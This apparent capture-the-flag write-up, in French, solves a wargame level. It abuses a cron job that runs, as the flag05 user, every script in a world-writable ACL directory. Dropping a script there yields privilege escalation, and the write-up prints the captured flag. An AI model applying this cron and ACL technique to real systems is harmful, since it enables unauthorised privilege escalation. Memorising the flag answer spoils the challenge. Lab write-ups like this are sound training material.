Quand je cherchais des infos pour ce challenge sur la VM ce message est apparu

```text
You have new mail in /var/mail/level05
```

```bash
> cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

Cela ressemble à un script qui est utilisé par crontab
il permet d'exécuter cette commande tout les 2 minute

La commande exécute `sh /usr/sbin/openarenaserver` avec les droits de `flag05`

```bash
> cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

Ce script exécute les scripts situés dans `/opt/openarenaserver/*` et les supprimes après l'exécution.

```bash
> ls -la /opt/
...
drwxrwxr-x+ 2 root root  40 Jun  2 17:30 openarenaserver
...
```

Le signe `+` signifie qu'il y a des droits étendus sur le dossier `openarenaserver`

```bash
> getfacl /opt/openarenaserver
...
user:level05:rwx
user:flag05:rwx
...
```

On voit que `level05` et `flag05` ont les droits d'écriture sur le dossier `openarenaserver`

Il nous suffit de créer un fichier dans le dossier `/opt/openarenaserver/` contenant :

```bash
getflag > /tmp/level05
```

```bash
> cat /tmp/level05
viuaaale9huek52boumoomioc
```